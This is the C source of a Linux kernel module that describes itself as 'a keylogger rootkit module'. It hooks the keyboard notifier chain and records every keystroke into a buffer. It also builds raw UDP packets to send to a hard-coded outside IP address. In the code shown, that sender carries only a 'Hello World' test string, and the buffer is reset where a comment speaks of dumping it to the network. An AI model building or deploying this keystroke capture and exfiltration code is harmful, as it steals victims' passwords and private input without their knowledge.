/* keylogger.c */

// for kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// for memset and memcpy
#include <linux/string.h>

// for keyboard and notification chain
#include <linux/notifier.h>
#include <linux/keyboard.h>

// for network
#include <linux/netdevice.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/netpoll.h>

#define DEBUG 1
#define debug(args...) if(DEBUG) printk(KERN_INFO args)

#define BUF_SIZE 256

static char key_buf[BUF_SIZE];
static unsigned int key_buf_ptr;

/* we only record ASCII characters and backspace, enter, tab, esc
 * return 1 if record the c */
int record_key(char c) {
    // ASCII
    if(c >= 0x20 && c < 0x7f) {
        key_buf[key_buf_ptr] = c;
        return 1;
    }
    // return 
    else if(c == 0x01) {
        key_buf[key_buf_ptr] = '\n';
        return 1;
    }
    // del
    else if(c == 0x7f) {
        key_buf[key_buf_ptr] = '\b';
        return 1;
    }
    // tab
    else if(c == 0x09) {
        key_buf[key_buf_ptr] = '\t';
        return 1;
    }
    // esc
    else if(c == 0x1b) {
        key_buf[key_buf_ptr] = '\e';
        return 1;
    }
    // do nothing
    else {
        return 0;
    }
}

/* print the latest recorded character*/
void print_key(void) {
    char c = key_buf[key_buf_ptr];
    // ASCII
    if(c >= 0x20 && c < 0x7f)
        printk(KERN_INFO "%c(0x%x)\n", c, c);
    // Non ASCII
    else
        printk(KERN_INFO ".(0x%x)\n", c);
}

#define IP_HEADER_RM 20
#define UDP_HEADER_RM 8

/* translate string to unsigned int for ip address */
static unsigned int inet_addr(char *ip) {
    int a, b, c, d;
    char res[4];
    sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);
    res[0] = (char)a;
    res[1] = (char)b;
    res[2] = (char)c;
    res[3] = (char)d;
    return *((unsigned int*)res);
}

/* send key_buf over the network 
 * return 0 for success and 1 for failure */
static int send_key_buf(void){
    
    static char addr[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t dest_addr[ETH_ALEN];

    unsigned char* data;
    char *srcIP = "10.0.2.15";
    char *dstIP = "123.123.123.123";
    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi";
    int udp_payload_len = 51;
    int udp_total_len = UDP_HEADER_RM + udp_payload_len;
    int ip_total_len = IP_HEADER_RM + udp_total_len;
    
    struct sk_buff* skb;

    struct net_device *enp0s3;

    struct udphdr* uh;
    struct iphdr* iph;
    struct ethhdr* eth;

    enp0s3 = dev_get_by_name(&init_net,"enp0s3");

    if (enp0s3 == NULL) {
        printk(KERN_ALERT "network device not found!\n");
        return 1;
    }

    memcpy(dest_addr, addr, ETH_ALEN);
    
    //allocate a network buffer
    skb = alloc_skb(ETH_HLEN + ip_total_len, GFP_ATOMIC);
    skb->dev = enp0s3;
    skb->pkt_type = PACKET_OUTGOING;
    //adjust headroom
    skb_reserve(skb, ETH_HLEN + IP_HEADER_RM + UDP_HEADER_RM);

    data = skb_put(skb, udp_payload_len);
    memcpy(data, hello_world, udp_payload_len);

    // udp header
    uh = (struct udphdr*)skb_push(skb, UDP_HEADER_RM);
    uh->len = htons(udp_total_len);
    uh->source = htons(15934); // upd ports
    uh->dest = htons(15904);

    // ip header
    iph = (struct iphdr*)skb_push(skb, IP_HEADER_RM);
    iph->ihl = IP_HEADER_RM / 4;//4*5=20 ip_header_len
    iph->version = 4; // IPv4u
    iph->tos = 0;
    iph->tot_len = htons(ip_total_len);
    iph->frag_off = 0;
    iph->ttl = 64; // Set a TTL.
    iph->protocol = IPPROTO_UDP; //  protocol.
    iph->check = 0;
    iph->saddr = inet_addr(srcIP);
    iph->daddr = inet_addr(dstIP);

    /* changing Mac address */   
    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    skb->no_fcs = 1;
    memcpy(eth->h_source, enp0s3->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, dest_addr, ETH_ALEN); /* set packet type and send the packet. */
    skb->pkt_type = PACKET_OUTGOING;
    
    // put the buffer into the sending queue of the device
    if(dev_queue_xmit(skb) < 0) {
        printk(KERN_ALERT "failing to send!\n");
        return 1;
    }

    return 0;
}

/* notifier callback function */
int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
    
    struct keyboard_notifier_param *param = data;

    if(action == KBD_KEYSYM && param->down) {
        
        debug("cb: down:%d; shift:%d; value:%x; ledstate:%d; action:%lx\n",
        param->down,
        param->shift,
        param->value,
        param->ledstate,
        action);

        if(record_key((char)param->value)) {
            print_key();
            key_buf_ptr++;
        }

        // loop back and dump the whole buffer to the network
        if(key_buf_ptr >= BUF_SIZE) {
            key_buf_ptr = 0;
            memset(key_buf, 0, BUF_SIZE);
        }

    }

    return NOTIFY_OK;
}

/* notifier block in the notification chain*/
static struct notifier_block nb = {
    .notifier_call = keylogger_cb,
};

/* init function */
static int keylogger_init(void)
{
    printk(KERN_INFO "Keylogger is loaded!\n");
    memset(key_buf, 0, BUF_SIZE);
    key_buf_ptr = 0;
    register_keyboard_notifier(&nb);
    send_key_buf();// for testing
    return 0;
}

/* exit function */
static void keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger is unloaded!\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("Richard Wu");
MODULE_DESCRIPTION ("a keylogger rootkit module");
MODULE_VERSION("1.0");
